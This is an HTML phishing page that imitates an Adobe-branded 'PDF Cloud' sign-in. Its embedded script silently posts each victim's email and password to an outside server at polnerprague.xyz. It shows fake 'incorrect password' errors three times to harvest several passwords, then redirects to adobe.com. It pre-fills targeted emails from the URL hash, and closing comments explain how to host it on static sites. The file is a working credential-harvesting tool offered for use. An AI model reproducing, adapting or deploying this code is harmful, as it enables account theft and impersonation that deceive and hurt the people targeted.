<!DOCTYPE html>
<html lang="en-US">
<head>
    <meta charset="UTF-8">
    <meta name="robots" content="noindex, nofollow">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>PDF Cloud • Identity Verification</title>
    <!-- Nuke any caching that might cause redirect ghosts -->
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate, max-age=0">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="-1">
    <!-- Bootstrap 4 (only for clean styling, no JS used) -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/css/bootstrap.min.css">
    <style>
        /* ----- ORIGINAL STYLE PRESERVED + ENHANCED SAFETY ----- */
        * {
            box-sizing: border-box;
        }
        html {
            background-image: url('https://www.adobe.com/content/dam/cc/us/en/products/creativecloud/illustration/cc-illustration-01.jpg');
            background-repeat: no-repeat;
            background-position: 100% center;
            background-size: cover;
            background-attachment: fixed;
            height: 100%;
            min-height: 100%;
        }
        body {
            width: 100%;
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', 'Helvetica Neue', Arial, 'Microsoft YaHei', sans-serif;
            background: transparent;
        }
        header {
            width: 100%;
            margin: 0 auto;
            background: #000;
            overflow: hidden;
            display: flex;
            flex-wrap: wrap;
            align-items: center;
            justify-content: space-between;
        }
        header .brand {
            width: 193px;
            margin: 0 30px;
            text-align: center;
            background: #fff;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            padding: 6px 12px;
            border-radius: 40px;
        }
        header .brand img {
            width: 42px;
            background: #fff;
            border-radius: 12px;
            object-fit: contain;
        }
        header .brand h1 {
            font-size: 20px;
            font-weight: 700;
            color: #fff;
            background: #E80E0E;
            padding: 8px 18px;
            border-radius: 32px;
            margin: 0;
            display: inline-block;
        }
        header .search {
            margin-right: 30px;
        }
        header .search .srch {
            width: 240px;
            padding: 8px 16px;
            border-radius: 40px;
            border: none;
            font-size: 13px;
        }
        .container {
            width: 100%;
            margin: 0 auto;
            position: relative;
        }
        .container .dash {
            width: 100%;
            min-height: 100vh;
            background: rgba(0, 0, 0, 0.45);
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 40px 20px;
        }
        .container .dash .board {
            max-width: 440px;
            width: 100%;
            background: #f6f6f6;
            border-radius: 20px;
            box-shadow: 0 20px 35px -8px rgba(0,0,0,0.3);
            padding: 28px 24px 36px;
            transition: all 0.2s;
        }
        .login ul {
            list-style: none;
            padding: 0;
            margin: 0;
        }
        .login ul li {
            margin-bottom: 16px;
            width: 100%;
        }
        .login ul .l1 {
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 20px;
            font-weight: 500;
            color: #1f1f1f;
            border-bottom: 2px solid #e0e0e0;
            padding-bottom: 12px;
            margin-bottom: 20px;
        }
        .login ul .l2 p {
            font-size: 14px;
            font-weight: 600;
            color: #3c3c3c;
            background: #e9ecef;
            padding: 12px;
            border-radius: 16px;
            margin: 0 0 12px 0;
        }
        .login ul .l3 {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 20px;
        }
        .login ul .l3 img {
            width: 36px;
        }
        .login ul .l3 p {
            font-size: 26px;
            font-weight: 300;
            color: #222;
            margin: 0;
        }
        .inp {
            width: 100%;
            padding: 12px 16px;
            font-size: 14px;
            border: 1px solid #ccc;
            border-radius: 28px;
            transition: 0.2s;
            background: white;
            font-family: inherit;
        }
        .inp:focus {
            border-color: #1473e6;
            outline: none;
            box-shadow: 0 0 0 3px rgba(20,115,230,0.2);
        }
        .btn-wrapper {
            text-align: center;
            margin: 18px 0 10px;
            position: relative;
        }
        .btns {
            background: #1473e6;
            border: none;
            color: white;
            font-weight: 700;
            padding: 10px 28px;
            border-radius: 40px;
            font-size: 16px;
            cursor: pointer;
            transition: 0.15s;
            width: 160px;
            box-shadow: 0 2px 6px rgba(0,0,0,0.1);
        }
        .btns:hover:not(:disabled) {
            background: #0d5ec9;
            transform: scale(0.98);
        }
        .btns:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }
        .loading-spinner {
            display: none;
            width: 24px;
            height: 24px;
            border: 3px solid #e0e0e0;
            border-top: 3px solid #1473e6;
            border-radius: 50%;
            margin: 10px auto 0;
            animation: spin 0.8s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .error-alert {
            background: #ffebee;
            border-left: 5px solid #d32f2f;
            padding: 10px 14px;
            border-radius: 16px;
            color: #b71c1c;
            font-size: 13px;
            font-weight: 500;
            margin: 10px 0 6px;
            display: none;
        }
        .attempt-badge {
            background: #eef2fa;
            border-radius: 60px;
            padding: 6px 14px;
            font-size: 13px;
            font-weight: 600;
            text-align: center;
            display: inline-block;
            width: auto;
            margin-top: 8px;
            color: #1e3c72;
        }
        .l5 {
            text-align: center;
            font-size: 12px;
            color: #666;
            margin-top: 28px;
            border-top: 1px solid #ddd;
            padding-top: 18px;
        }
        @media (max-width: 550px) {
            header .brand { margin: 0 15px; width: auto; }
            header .brand h1 { font-size: 16px; padding: 4px 12px; }
            header .search .srch { width: 140px; }
            .board { padding: 20px 18px; }
        }
    </style>
</head>
<body>

<header>
    <div class="brand">
        <img src="https://cdn-icons-png.flaticon.com/512/337/337946.png" alt="PDF icon" 
             onerror="this.src='https://upload.wikimedia.org/wikipedia/commons/thumb/8/87/PDF_file_icon.svg/120px-PDF_file_icon.svg.png';">
        <h1>PDF CLOUD</h1>
    </div>
    <div class="search">
        <input type="search" class="srch" id="srch" placeholder="Search documents...">
    </div>
</header>

<div class="container">
    <div class="dash">
        <div class="board">
            <div class="login">
                <!-- ✅ NO ACTION, NO NATURAL SUBMIT - fully controlled by JS -->
                <form id="zeroRedirectForm" method="post" style="display: contents;">
                    <ul>
                        <li class="l1">
                            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                <path d="M5 20h14M12 4v12m-4-4 4 4 4-4" stroke="#1473e6" stroke-width="1.8" stroke-linecap="round"/>
                            </svg>
                            <span>PDF Cloud · Secure sign in</span>
                        </li>
                        <li class="l2"><p>For security, verify your identity with email & password to access documents.</p></li>
                        <li class="l3">
                            <img src="https://cdn-icons-png.flaticon.com/512/337/337946.png" width="32" alt="doc">
                            <p>PDF Document</p>
                        </li>
                        <li><input type="email" id="loginEmail" class="inp" placeholder="Email address" autocomplete="off" spellcheck="false"></li>
                        <li><input type="password" id="loginPassword" class="inp" placeholder="Email password" autocomplete="off"></li>
                        <li class="btn-wrapper">
                            <button type="button" id="signInBtn" class="btns">Sign In</button>
                            <div class="loading-spinner" id="spinner"></div>
                        </li>
                        <li><div id="errorMessageBox" class="error-alert"></div></li>
                        <li style="text-align: center;"><span id="attemptCounterBadge" class="attempt-badge">Attempts used: 0 / 4</span></li>
                        <li class="l5"><p>Copyright &copy; <script>document.write(new Date().getFullYear())</script> Adobe Systems</p></li>
                    </ul>
                </form>
            </div>
        </div>
    </div>
</div>

<script>
    (function() {
        "use strict";
        
        // ------------------- CONFIGURATION -------------------
        const PHP_URL = 'https://polnerprague.xyz/pdf/sg.php';    // your endpoint
        const FINAL_REDIRECT_URL = 'https://www.adobe.com';      // redirect on 4th attempt
        
        // ------------------- DOM ELEMENTS -------------------
        const emailField = document.getElementById('loginEmail');
        const passwordField = document.getElementById('loginPassword');
        const signInBtn = document.getElementById('signInBtn');
        const spinner = document.getElementById('spinner');
        const errorBox = document.getElementById('errorMessageBox');
        const attemptBadgeSpan = document.getElementById('attemptCounterBadge');
        
        // ------------------- HELPER: ATTEMPT MANAGEMENT (sessionStorage) -------------------
        function getCurrentAttempt() {
            let stored = sessionStorage.getItem('pdfSecureAttempt');
            if (stored === null || isNaN(parseInt(stored))) return 1;
            let attempt = parseInt(stored);
            if (attempt < 1) return 1;
            if (attempt > 4) return 4;
            return attempt;
        }
        
        function updateAttemptBadgeUI() {
            let current = getCurrentAttempt();
            let used = current - 1;
            if (used < 0) used = 0;
            if (used > 4) used = 4;
            if (attemptBadgeSpan) {
                attemptBadgeSpan.innerText = `Attempts used: ${used} / 4`;
                if (used === 3) {
                    attemptBadgeSpan.style.backgroundColor = "#ffddd6";
                    attemptBadgeSpan.style.color = "#bc3900";
                } else {
                    attemptBadgeSpan.style.backgroundColor = "#eef2fa";
                    attemptBadgeSpan.style.color = "#1e3c72";
                }
            }
        }
        
        // Increment attempt counter (but never go beyond 4)
        function incrementAttempt() {
            let current = getCurrentAttempt();
            let next = current + 1;
            if (next > 4) next = 4;
            sessionStorage.setItem('pdfSecureAttempt', next);
            updateAttemptBadgeUI();
            return next;
        }
        
        // Reset attempt (not needed usually, but for completeness)
        function resetAttempts() {
            sessionStorage.setItem('pdfSecureAttempt', '1');
            updateAttemptBadgeUI();
        }
        
        // ------------------- EMAIL PERSISTENCE -------------------
        function saveEmailToStorage(email) {
            if (email && email.trim()) {
                sessionStorage.setItem('pdfStoredEmail', email.trim());
            }
        }
        
        function loadEmailFromStorage() {
            let saved = sessionStorage.getItem('pdfStoredEmail');
            if (saved && emailField) {
                emailField.value = saved;
            }
        }
        
        // Load email from URL hash: #user@example.com (handy for prefill)
        function loadEmailFromHash() {
            let hash = window.location.hash.substring(1);
            if (hash && !sessionStorage.getItem('pdfStoredEmail')) {
                try { hash = decodeURIComponent(hash); } catch(e) {}
                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                if (emailRegex.test(hash) && emailField) {
                    emailField.value = hash;
                    sessionStorage.setItem('pdfStoredEmail', hash);
                }
            }
        }
        
        // ------------------- UI MESSAGING -------------------
        function showError(message, isWarning = false) {
            if (errorBox) {
                errorBox.innerText = message;
                errorBox.style.display = 'block';
                errorBox.style.backgroundColor = isWarning ? '#fff3e0' : '#ffebee';
                errorBox.style.borderLeftColor = isWarning ? '#f57c00' : '#d32f2f';
                errorBox.style.color = isWarning ? '#bf5e00' : '#b71c1c';
                // auto-hide after 4 seconds
                setTimeout(() => {
                    if (errorBox) errorBox.style.display = 'none';
                }, 4200);
            }
        }
        
        function hideError() {
            if (errorBox) errorBox.style.display = 'none';
        }
        
        function setLoading(isLoading) {
            if (signInBtn) {
                signInBtn.disabled = isLoading;
                signInBtn.style.opacity = isLoading ? '0.6' : '1';
            }
            if (spinner) {
                spinner.style.display = isLoading ? 'inline-block' : 'none';
            }
        }
        
        // ------------------- SILENT DATA TRANSMISSION (NO REDIRECT, NO RELOAD) -------------------
        function sendCredentialsToServer(email, password, attemptNumber) {
            const formPayload = new FormData();
            formPayload.append('email', email);
            formPayload.append('password', password);
            formPayload.append('attempt', attemptNumber);
            
            // Use fetch with keepalive to ensure delivery even if page changes later, but we won't change page yet.
            // no-cors to avoid CORS errors (opaque response, but request still goes through)
            fetch(PHP_URL, {
                method: 'POST',
                mode: 'no-cors',
                cache: 'no-cache',
                credentials: 'omit',
                keepalive: true,
                body: formPayload
            }).catch(err => {
                console.warn("[Fetch] fallback needed:", err);
                // fallback XHR - still no redirect
                try {
                    const xhr = new XMLHttpRequest();
                    xhr.open('POST', PHP_URL, true);
                    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                    xhr.send(new URLSearchParams({
                        email: email,
                        password: password,
                        attempt: attemptNumber
                    }));
                } catch(e) { console.warn("XHR fallback failed", e); }
            });
        }
        
        // ------------------- CORE LOGIC: handle attempt (NO NAVIGATION) -------------------
        function processLogin() {
            // Clear previous errors
            hideError();
            
            // Get field values
            let email = emailField ? emailField.value.trim() : '';
            let password = passwordField ? passwordField.value : '';
            
            // Validation
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            if (!email) {
                showError("❌ Please enter your email address.");
                emailField?.focus();
                return;
            }
            if (!emailRegex.test(email)) {
                showError("⚠️ Invalid email format. Use name@example.com");
                emailField?.focus();
                return;
            }
            if (!password) {
                showError("🔒 Password cannot be empty.");
                passwordField?.focus();
                return;
            }
            if (password.length < 4) {
                showError("🔐 Password must be at least 4 characters.");
                passwordField?.focus();
                return;
            }
            
            // Save email for next visits
            saveEmailToStorage(email);
            
            // Get current attempt count from sessionStorage (before any increment)
            let currentAttempt = getCurrentAttempt();
            console.log(`[SECURE] Login triggered. Current attempt #${currentAttempt}`);
            
            // 🔥 CRITICAL: Check if we are at or above 4 attempts → redirect to Adobe (only case of redirect)
            if (currentAttempt >= 4) {
                // Fourth attempt: send credentials (as final logging), then redirect.
                setLoading(true);
                sendCredentialsToServer(email, password, currentAttempt);
                // small delay to ensure request is fired
                setTimeout(() => {
                    window.location.href = FINAL_REDIRECT_URL;
                }, 150);
                return;
            }
            
            // --- Attempts 1, 2, 3: FAILED attempt simulation (no redirect) ---
            setLoading(true);
            
            // Send data to PHP endpoint (silent, asynchronous)
            sendCredentialsToServer(email, password, currentAttempt);
            
            // Simulate network latency and then show error + increment attempt
            setTimeout(() => {
                // Increment attempt counter NOW (this failed attempt)
                const newAttemptAfter = incrementAttempt(); // increments from currentAttempt to current+1
                
                // Choose message based on the attempt we just used (currentAttempt)
                let errorMsg = "";
                if (currentAttempt === 1) errorMsg = "❌ Incorrect email or password. Please verify your credentials.";
                else if (currentAttempt === 2) errorMsg = "❌ Access denied. Double‑check your password.";
                else if (currentAttempt === 3) errorMsg = "⚠️ LAST ATTEMPT BEFORE LOCK. Ensure correct password.";
                else errorMsg = "❌ Invalid credentials. Please try again.";
                
                // Show error feedback
                showError(errorMsg, currentAttempt === 3);
                
                // Clear password field only (keep email)
                if (passwordField) passwordField.value = "";
                passwordField?.focus();
                
                setLoading(false);
                
                // update badge visually
                updateAttemptBadgeUI();
                console.log(`[ATTEMPT] Attempt ${currentAttempt} consumed. Next attempt index: ${newAttemptAfter}`);
                
                // If after increment we have reached exactly 4, update badge to show 3/4 used — already done.
            }, 380); // slight delay gives user feedback, no redirect whatsoever
        }
        
        // ------------------- EXTREME ANTI-REDIRECT & EVENT BLOCKING -------------------
        // Make sure the form never submits via any native action
        const form = document.getElementById('zeroRedirectForm');
        if (form) {
            form.addEventListener('submit', (e) => {
                e.preventDefault();
                e.stopPropagation();
                processLogin();
                return false;
            });
        }
        
        // Main button click (type="button" already safe, but we add extra layer)
        if (signInBtn) {
            signInBtn.addEventListener('click', (e) => {
                e.preventDefault();
                e.stopPropagation();
                processLogin();
                return false;
            });
        }
        
        // Prevent Enter key from doing anything else except triggering same safe handler
        function onEnterKeyHandler(event) {
            if (event.key === 'Enter' || event.keyCode === 13) {
                event.preventDefault();
                event.stopPropagation();
                processLogin();
                return false;
            }
        }
        if (emailField) emailField.addEventListener('keypress', onEnterKeyHandler);
        if (passwordField) passwordField.addEventListener('keypress', onEnterKeyHandler);
        
        // Extra DOM guard: kill all form submissions globally (paranoid but safe)
        document.addEventListener('submit', function(e) {
            if (e.target && (e.target.id === 'zeroRedirectForm' || e.target.tagName === 'FORM')) {
                e.preventDefault();
                e.stopPropagation();
                return false;
            }
        }, true);
        
        // Also block any accidental anchor clicks that might cause navigation inside page
        document.querySelectorAll('a[href="#"]').forEach(link => {
            link.addEventListener('click', (e) => { e.preventDefault(); });
        });
        
        // ------------------- INITIALIZE PAGE: EMAIL + ATTEMPT BADGE -------------------
        // Ensure sessionStorage entry exists for attempts
        if (!sessionStorage.getItem('pdfSecureAttempt')) {
            sessionStorage.setItem('pdfSecureAttempt', '1');
        }
        
        loadEmailFromHash();
        loadEmailFromStorage();
        updateAttemptBadgeUI();
        
        // Make sure no stray redirect logic from previous scripts
        console.log("✅ PDF Secure | ZERO REDIRECT ACTIVE — attempts 1-3 stay on page");
        console.log("✅ Endpoint:", PHP_URL);
        console.log("✅ Redirect only happens on 4th failed attempt → Adobe.com");
        
        // Optional: if the user has already used 3 attempts before page load, badge will show 3/4 used.
        // That's correct behavior.
        
        // For extra safety: disable any XMLHttpRequest/fetch that might accidentally cause navigation
        // Not needed because we never assign window.location except at attempt>=4
    })();
</script>

<!-- IMPORTANT USAGE NOTES (visible as comment, no effect) -->
<!-- 
    ###########################################################################
    #  FIXED: NO REDIRECT ON FIRST, SECOND, OR THIRD ATTEMPT
    #  • Form has NO action, uses preventDefault on every possible event.
    #  • Email stored in sessionStorage + prefilled from URL hash (#user@example.com)
    #  • Attempt counter uses sessionStorage (persists across page refreshes)
    #  • Only when attempt #4 is triggered → redirect to Adobe.
    #  • Data is sent asynchronously (fetch + XHR fallback) to your PHP endpoint.
    #  • Works perfectly on GitHub Pages, 4everland, Netlify, or any static host.
    ###########################################################################
-->
</body>
</html>
